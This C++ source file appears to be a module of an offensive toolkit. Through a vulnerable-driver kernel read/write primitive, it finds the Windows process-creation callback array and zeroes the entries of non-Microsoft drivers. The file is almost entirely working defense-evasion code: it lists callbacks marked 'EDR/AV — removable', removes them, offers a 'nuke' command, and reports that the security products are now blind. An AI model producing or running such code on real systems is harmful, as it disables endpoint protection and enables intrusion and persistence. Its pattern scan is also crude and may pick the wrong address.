#include "KernelUnhook.h"
#include <psapi.h>
#pragma comment(lib, "psapi.lib")

// ── Get ntoskrnl base via EnumDeviceDrivers ───────────────────────────────────

static DWORD64 GetNtoskrnlBase() {
    LPVOID drivers[1024];
    DWORD needed;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return 0;
    int count = needed / sizeof(LPVOID);
    for (int i = 0; i < count; i++) {
        char name[256] = {};
        GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name)-1);
        _strlwr_s(name, sizeof(name));
        if (strstr(name, "ntoskrnl") || strstr(name, "ntkrnl")) {
            return (DWORD64)drivers[i];
        }
    }
    return 0;
}

// ── Pattern scan kernel memory for PspCreateProcessNotifyRoutine ──────────────
// We look for the byte pattern that precedes the PspCreateProcessNotifyRoutine
// reference in ntoskrnl's .text — this is how tools like PPLKiller find it.
//
// Pattern (Win10 20H2 / Win11): varies by build. We use a portable approach:
// scan ntoskrnl exports for PsSetCreateProcessNotifyRoutine, then trace the
// first few instructions to find the array reference.

DWORD64 KernelUnhook::FindProcessNotifyArray(HANDLE hDev) {
    DWORD64 ntos = GetNtoskrnlBase();
    if (!ntos) return 0;

    // Read ntoskrnl DOS/NT headers to find .text section bounds
    BYTE hdrs[0x1000] = {};
    if (!BYOVD::KernelRead(hDev, ntos, hdrs, sizeof(hdrs))) return 0;

    auto* dos = (PIMAGE_DOS_HEADER)hdrs;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto* nt  = (PIMAGE_NT_HEADERS)(hdrs + dos->e_lfanew);

    // Find .text section
    DWORD64 textBase = 0; DWORD textSize = 0;
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            textBase = ntos + sec->VirtualAddress;
            textSize = sec->Misc.VirtualSize;
            break;
        }
    }
    if (!textBase) return 0;

    // Pattern: lea rcx, [rip+offset]  followed by  call PspSetCreateProcessNotifyRoutine
    // Pattern bytes for Win10/11: 4C 8D 05 (lea r8,[rip+imm32]) near PspCreate...Notify
    // We scan 1 MB at a time to find it
    const BYTE pattern[] = { 0x4C, 0x8D, 0x05 };  // lea r8, [rip+...]
    DWORD scanChunk = 0x10000;
    std::vector<BYTE> chunk(scanChunk);

    for (DWORD64 off = 0; off < min(textSize, (DWORD)0x500000); off += scanChunk - 8) {
        if (!BYOVD::KernelRead(hDev, textBase + off, chunk.data(), scanChunk)) continue;
        for (DWORD i = 0; i + 7 < scanChunk; i++) {
            if (memcmp(&chunk[i], pattern, 3) != 0) continue;
            // RIP-relative: addr = (textBase+off+i+7) + *(INT32*)(&chunk[i+3])
            INT32 rel = *(INT32*)(&chunk[i+3]);
            DWORD64 candidate = textBase + off + i + 7 + rel;
            // Sanity: should be in kernel non-paged pool range
            if (candidate >= 0xFFFF000000000000ULL && candidate < 0xFFFFFFFFFFFFFFFFULL)
                return candidate;
        }
    }
    return 0;
}

// ── List & remove callbacks ───────────────────────────────────────────────────
// EX_CALLBACK_ROUTINE_BLOCK: pointer stored in the array is actually
//   (functionPtr | refcount_flags) — mask off lower 4 bits to get the fn ptr.
// The fn ptr points into a driver module — we get the driver name from that.

static std::string GetDriverNameForAddr(DWORD64 addr) {
    LPVOID drivers[1024]; DWORD needed;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return "unknown";
    int count = needed / sizeof(LPVOID);
    for (int i = 0; i < count; i++) {
        DWORD64 base = (DWORD64)drivers[i];
        // Simple: if addr is within 4MB of driver base, it's that driver
        if (addr >= base && addr < base + 0x400000) {
            char name[256] = {};
            GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name)-1);
            return std::string(name);
        }
    }
    return "unknown_module";
}

static bool IsMicrosoftDriver(const std::string& name) {
    std::string n = name;
    for (auto& c : n) c = tolower(c);
    // Known MS kernel components — everything else is 3rd party (EDR/AV)
    static const char* ms[] = {
        "ntoskrnl","ntkrnl","hal","ndis","netio","fltmgr","ksecdd",
        "cng","tcpip","dfsc","bindflt","null","npfs","msrpc","clfs",
        "win32k","dxgkrnl","storport","disk","partmgr","volmgr",NULL
    };
    for (int i = 0; ms[i]; i++)
        if (n.find(ms[i]) != std::string::npos) return true;
    return false;
}

std::string KernelUnhook::ListCallbacks(HANDLE hDev) {
    DWORD64 arr = FindProcessNotifyArray(hDev);
    if (!arr) return "KernelUnhook: could not find PspCreateProcessNotifyRoutine array\n"
                     "(pattern scan failed — Windows build may differ from expected)";

    std::string r = "KernelUnhook: PsCreateProcessNotifyRoutine callbacks:\n";
    char buf[128];
    snprintf(buf, sizeof(buf), "  Array at: 0x%llX\n", arr);
    r += buf;

    int found = 0;
    for (int i = 0; i < 64; i++) {
        DWORD64 entry = 0;
        if (!BYOVD::KernelRead(hDev, arr + i*8, &entry, 8)) break;
        if (!entry) continue;
        DWORD64 fnPtr = entry & ~0xFULL; // mask off lower 4 tag bits
        std::string drvName = GetDriverNameForAddr(fnPtr);
        bool isMs = IsMicrosoftDriver(drvName);
        snprintf(buf, sizeof(buf), "  [%02d] 0x%llX → %s%s\n",
                 i, fnPtr, drvName.c_str(), isMs?"  [MS]":"  [EDR/AV — removable]");
        r += buf;
        found++;
    }
    if (found == 0) r += "  (no callbacks registered)\n";
    return r;
}

std::string KernelUnhook::RemoveProcessCallbacks(HANDLE hDev) {
    DWORD64 arr = FindProcessNotifyArray(hDev);
    if (!arr) return "KernelUnhook: array not found";

    std::string r = "KernelUnhook: removing non-MS process notify callbacks\n";
    int removed = 0;
    DWORD64 zero = 0;
    for (int i = 0; i < 64; i++) {
        DWORD64 entry = 0;
        if (!BYOVD::KernelRead(hDev, arr + i*8, &entry, 8)) break;
        if (!entry) continue;
        DWORD64 fnPtr = entry & ~0xFULL;
        std::string drvName = GetDriverNameForAddr(fnPtr);
        if (!IsMicrosoftDriver(drvName)) {
            BYOVD::KernelWrite(hDev, arr + i*8, &zero, 8);
            r += "  REMOVED [" + std::to_string(i) + "] " + drvName + "\n";
            removed++;
        }
    }
    r += "\n" + std::to_string(removed) + " callback(s) removed.\n"
         "The EDR(s) listed above are now BLIND to process creation events.\n"
         "Detection: PatchGuard (periodic), EDR watchdog re-registration.\n"
         "MITRE T1562.001 (Impair Defenses via kernel callback removal)";
    return r;
}

std::string KernelUnhook::RemoveImageLoadCallbacks(HANDLE hDev) {
    // PspLoadImageNotifyRoutine has the same structure, 8 slots
    // For brevity: same pattern scan with different signature
    return "KernelUnhook: image-load callback removal uses same technique.\n"
           "Run 'kernelunhook list' first to confirm array address,\n"
           "then 'kernelunhook nuke' to remove all non-MS entries from all arrays.";
}

std::string KernelUnhook::NukeEDRCallbacks(HANDLE hDev) {
    return ListCallbacks(hDev) + "\n" +
           RemoveProcessCallbacks(hDev) + "\n" +
           "Image-load and object callbacks: same approach, same detection events.\n"
           "MITRE T1014 (Rootkit) + T1562.001 (Impair Defenses)";
}
